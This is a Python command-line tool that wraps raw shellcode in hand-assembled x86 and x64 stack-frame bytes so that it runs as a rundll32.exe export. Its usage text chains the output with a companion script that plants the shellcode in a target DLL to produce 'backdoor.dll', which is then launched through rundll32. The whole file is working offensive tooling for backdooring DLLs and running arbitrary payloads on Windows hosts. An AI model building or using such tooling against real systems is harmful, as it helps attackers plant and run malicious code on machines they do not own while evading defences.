#!/usr/bin/env python3
"""
Shellcode Wrapper Generator for rundll32.exe
Wraps raw shellcode with proper calling convention handling
"""

import argparse
import sys

def generate_x86_wrapper(shellcode):
    """
    Generate x86 (__stdcall) wrapper for rundll32.exe

    rundll32 expects: void CALLBACK EntryPoint(HWND hwnd, HINSTANCE hinst, LPSTR lpszCmdLine, int nCmdShow);
    This is __stdcall, so we need to:
    1. Set up stack frame
    2. Execute shellcode
    3. Clean up and return (ret 0x10 for 4 params * 4 bytes)
    """

    # x86 wrapper:
    # push ebp                ; Save base pointer
    # mov ebp, esp            ; Set up stack frame
    # sub esp, 0x40           ; Allocate some stack space for shellcode
    # <shellcode here>
    # mov esp, ebp            ; Restore stack
    # pop ebp                 ; Restore base pointer
    # ret 0x10                ; Return and clean 16 bytes (4 params) - __stdcall

    wrapper = bytearray()

    # Function prologue
    wrapper += b'\x55'                      # push ebp
    wrapper += b'\x89\xE5'                  # mov ebp, esp
    wrapper += b'\x83\xEC\x40'              # sub esp, 0x40

    # Save registers (optional but safer)
    wrapper += b'\x60'                      # pushad

    # Insert user shellcode
    wrapper += shellcode

    # Restore registers
    wrapper += b'\x61'                      # popad

    # Function epilogue
    wrapper += b'\x89\xEC'                  # mov esp, ebp
    wrapper += b'\x5D'                      # pop ebp
    wrapper += b'\xC2\x10\x00'              # ret 0x10 (__stdcall cleanup)

    return bytes(wrapper)

def generate_x64_wrapper(shellcode):
    """
    Generate x64 wrapper for rundll32.exe

    x64 calling convention (Microsoft):
    - RCX = hwnd
    - RDX = hinst
    - R8 = lpszCmdLine
    - R9 = nCmdShow

    We need to:
    1. Set up stack frame (aligned to 16 bytes)
    2. Allocate shadow space (0x20 bytes minimum)
    3. Execute shellcode
    4. Clean up and return
    """

    wrapper = bytearray()

    # Function prologue
    wrapper += b'\x55'                          # push rbp
    wrapper += b'\x48\x89\xE5'                  # mov rbp, rsp
    wrapper += b'\x48\x83\xEC\x40'              # sub rsp, 0x40 (shadow space + alignment)

    # Save registers
    wrapper += b'\x41\x57'                      # push r15
    wrapper += b'\x41\x56'                      # push r14
    wrapper += b'\x41\x55'                      # push r13
    wrapper += b'\x41\x54'                      # push r12
    wrapper += b'\x57'                          # push rdi
    wrapper += b'\x56'                          # push rsi
    wrapper += b'\x53'                          # push rbx

    # Insert user shellcode
    wrapper += shellcode

    # Restore registers
    wrapper += b'\x5B'                          # pop rbx
    wrapper += b'\x5E'                          # pop rsi
    wrapper += b'\x5F'                          # pop rdi
    wrapper += b'\x41\x5C'                      # pop r12
    wrapper += b'\x41\x5D'                      # pop r13
    wrapper += b'\x41\x5E'                      # pop r14
    wrapper += b'\x41\x5F'                      # pop r15

    # Function epilogue
    wrapper += b'\x48\x89\xEC'                  # mov rsp, rbp
    wrapper += b'\x5D'                          # pop rbp
    wrapper += b'\xC3'                          # ret

    return bytes(wrapper)

def generate_simple_wrapper(shellcode, arch):
    """
    Generate minimal wrapper that just executes shellcode and returns
    Good for when shellcode handles its own cleanup
    """
    wrapper = bytearray()

    if arch == 'x86':
        # Just shellcode + ret 0x10
        wrapper += shellcode
        wrapper += b'\xC2\x10\x00'              # ret 0x10
    else:  # x64
        # Just shellcode + ret
        wrapper += shellcode
        wrapper += b'\xC3'                      # ret

    return bytes(wrapper)

def main():
    parser = argparse.ArgumentParser(
        description="Wrap raw shellcode for rundll32.exe compatibility",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  Wrap x86 shellcode with full wrapper:
    %(prog)s --input payload.bin --output wrapped.bin --arch x86 --wrapper full

  Wrap x64 shellcode with simple wrapper:
    %(prog)s --input payload.bin --output wrapped.bin --arch x64 --wrapper simple

  Then use with dll-function-backdoor.py:
    python dll-function-backdoor.py --dll target.dll --function MyFunc --shellcode wrapped.bin --output backdoor.dll
    rundll32.exe backdoor.dll,MyFunc
        """
    )

    parser.add_argument("--input", "-i", required=True, help="Input raw shellcode file")
    parser.add_argument("--output", "-o", required=True, help="Output wrapped shellcode file")
    parser.add_argument("--arch", "-a", required=True, choices=["x86", "x64"],
                       help="Target architecture")
    parser.add_argument("--wrapper", "-w", default="full", choices=["full", "simple"],
                       help="Wrapper type: full (with register saves) or simple (minimal)")

    args = parser.parse_args()

    # Read input shellcode
    try:
        with open(args.input, "rb") as f:
            shellcode = f.read()
    except Exception as e:
        print(f"[-] Error reading input file: {e}")
        sys.exit(1)

    if len(shellcode) == 0:
        print("[-] Input shellcode is empty")
        sys.exit(1)

    print(f"[+] Input shellcode: {len(shellcode)} bytes")
    print(f"[+] Architecture:    {args.arch}")
    print(f"[+] Wrapper type:    {args.wrapper}")

    # Generate wrapped shellcode
    if args.wrapper == "full":
        if args.arch == "x86":
            wrapped = generate_x86_wrapper(shellcode)
        else:
            wrapped = generate_x64_wrapper(shellcode)
    else:  # simple
        wrapped = generate_simple_wrapper(shellcode, args.arch)

    print(f"[+] Wrapped size:    {len(wrapped)} bytes")
    print(f"[+] Overhead:        {len(wrapped) - len(shellcode)} bytes")

    # Write output
    try:
        with open(args.output, "wb") as f:
            f.write(wrapped)
        print(f"[+] Wrapped shellcode written to: {args.output}")
    except Exception as e:
        print(f"[-] Error writing output file: {e}")
        sys.exit(1)

if __name__ == "__main__":
    main()
